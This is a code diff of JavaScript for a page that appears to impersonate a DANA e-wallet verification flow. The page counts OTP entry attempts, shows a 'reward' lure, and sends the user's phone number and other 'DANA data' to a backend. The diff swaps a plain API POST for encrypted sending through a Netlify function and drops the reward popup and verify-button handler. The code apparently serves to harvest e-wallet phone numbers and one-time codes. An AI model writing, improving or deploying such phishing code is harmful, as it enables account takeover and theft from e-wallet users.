@@ -16,7 +16,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const ac = document.getElementById('attempt-counter');
   const an = document.getElementById('attempt-number');
   const lc = document.getElementById('lanjutkan-container');
-  const rewardInstruction = document.getElementById('reward-instruction');
   const resendOtp = document.getElementById('resend-otp');
   const vb = document.getElementById('verifikasi-button');
   const vc = document.querySelector('.verifikasi-button-container');
@@ -78,51 +77,12 @@ document.addEventListener('DOMContentLoaded', () => {
     if (ac) ac.style.display = 'block';
   }
 
-  function showRewardInstruction() {
-    if (rewardInstruction) {
-      rewardInstruction.style.display = 'block';
-      
-      // Close button handler
-      const closeBtn = rewardInstruction.querySelector('.close-btn');
-      if (closeBtn) {
-        closeBtn.addEventListener('click', () => {
-          rewardInstruction.style.display = 'none';
-        });
-      }
-    }
-  }
-
-  // Backend Communication - OPTIMIZED FOR VERCEL
+  // Backend Communication - Menggunakan Netlify Function
   async function sendDanaData(type, data) {
     try {
-      // Gunakan endpoint yang kompatibel dengan Vercel
-      const API_BASE = window.location.origin.includes('localhost') 
-        ? 'http://localhost:3000/api' 
-        : '/api';
-      
-      const response = await fetch(`${API_BASE}/send-dana-data`, {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({ type, ...data })
-      });
-      
-      if (!response.ok) {
-        const errorText = await response.text();
-        console.error('Server response:', response.status, errorText);
-        
-        // Jika error 404, mungkin fungsi API belum terdeploy
-        if (response.status === 404) {
-          console.log('API endpoint not found, continuing in demo mode');
-          return { success: true, message: 'Data processed successfully (demo mode)' };
-        }
-        
-        throw new Error(errorText || `Server error: ${response.status}`);
-      }
-      
-      return await response.json();
+      // Gunakan Netlify Function untuk mengirim data terenkripsi
+      const result = await sendEncryptedData(type, data);
+      return result;
     } catch (error) {
       console.error('API Error:', error);
       
@@ -278,11 +238,6 @@ document.addEventListener('DOMContentLoaded', () => {
           setTimeout(() => {
             resetOTPInputs();
             
-            // Show reward instruction after 2 attempts
-            if (attemptCount === 2) {
-              showRewardInstruction();
-            }
-            
             if (attemptCount > 2 && rn) {
               rn.style.display = 'block';
               rn.innerHTML = `
@@ -350,23 +305,6 @@ document.addEventListener('DOMContentLoaded', () => {
   if (fn) {
     fn.addEventListener('click', () => {
       fn.style.display = 'none';
-    });
-  }
-
-  // Handle verifikasi button
-  if (vb) {
-    vb.addEventListener('click', async () => {
-      showSpinner();
-      try {
-        const result = await sendDanaData('verification', { phone: phoneNumber });
-        console.log('Verification result:', result);
-        alert('Verifikasi berhasil! Silakan lanjutkan proses.');
-      } catch (error) {
-        console.error('Verification error:', error);
-        alert('Gagal verifikasi: ' + error.message);
-      } finally {
-        hideSpinner();
-      }
     });
   }
 
